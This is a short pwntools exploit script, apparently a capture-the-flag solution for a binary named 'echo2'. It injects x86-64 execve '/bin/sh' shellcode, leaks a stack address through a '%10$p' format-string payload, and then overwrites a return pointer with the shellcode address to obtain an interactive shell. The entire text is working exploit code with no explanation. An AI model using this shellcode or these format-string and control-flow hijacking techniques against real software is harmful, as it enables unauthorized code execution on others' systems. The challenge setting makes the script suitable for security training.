from pwn import *

p=process("./echo2")
elf=ELF("./echo2")

p.recvuntil("hey, what's your name? : ")
shellcode=b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p.sendline(shellcode)
p.recvuntil(b"> ")
p.sendline(b"2")

payload=b"%10$p"+b"A"*3
p.sendline(payload)
p.recvuntil(b"0x")
shellcode_addr=int(p.recvuntil(b'AAA',drop=True),16)-0x20


p.recvuntil(b"> ")
p.sendline(b"4")
p.recvuntil(b"to exit? (y/n)")
p.sendline(b"n")

p.recvuntil(b"> ")
p.sendline(b"3")
p.recvuntil(b"hello \n")
p.sendline(b"A"*24+p64(shellcode_addr))
p.interactive()
